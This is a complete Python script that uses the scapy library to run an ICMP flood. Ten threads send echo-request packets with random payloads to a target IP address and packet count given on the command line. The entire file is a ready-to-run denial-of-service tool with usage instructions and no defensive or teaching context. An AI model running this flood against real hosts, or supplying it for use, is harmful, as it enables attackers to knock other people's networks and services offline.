from scapy.all import IP, ICMP, send
import sys
import random
import string
import threading
import time

def generate_random_payload(length):
    """Generate a random payload of the specified length."""
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

def icmp_flood(destination, packet_count):
    # Send packets
    for _ in range(packet_count):
        # Generate a random payload
        icmp_payload = generate_random_payload(random.randint(50, 150))  # Random payload length

        # Craft ICMP Echo Request packet with random payload
        icmp_pkt = IP(dst=destination) / ICMP() / icmp_payload

        # Send packet
        send(icmp_pkt, verbose=False)

def send_icmp_flood(destination, packet_count):
    print("Sending ICMP flood to", destination)
    threads = []
    for _ in range(10):  # Number of threads for concurrency
        t = threading.Thread(target=icmp_flood, args=(destination, packet_count // 10))
        threads.append(t)
        t.start()

    # Wait for all threads to complete
    for t in threads:
        t.join()

    print("ICMP flood completed.")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python icmp_flood.py <Dst IP> <Packet Count>")
        sys.exit(1)
    
    destination_ip = sys.argv[1]
    packet_count = int(sys.argv[2])
    
    # Start ICMP flood
    send_icmp_flood(destination_ip, packet_count)
